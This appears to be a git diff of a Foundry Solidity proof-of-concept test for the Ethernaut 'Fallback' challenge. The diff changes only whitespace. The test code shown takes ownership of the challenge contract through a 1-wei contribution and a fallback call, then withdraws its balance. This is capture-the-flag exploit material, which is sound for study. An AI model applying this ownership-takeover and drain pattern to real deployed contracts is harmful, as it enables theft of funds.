@@ -12,6 +12,7 @@ contract FallbackPOCTest is Test {
     function setUp() external {
         vm.label(INSTANCE, "Fallback");
     }
+
     function test() external {
         vm.startBroadcast();
 
@@ -20,14 +21,14 @@ contract FallbackPOCTest is Test {
         instance.contribute{value: 1 wei}();
         (bool success,) = payable(INSTANCE).call{value: 1 wei}("");
         assertTrue(success);
-        
+
         instance.withdraw();
 
         instance.owner();
 
         assertEq(instance.owner(), msg.sender);
         assertEq(INSTANCE.balance, 0);
-        
+
         vm.stopBroadcast();
     }
 }
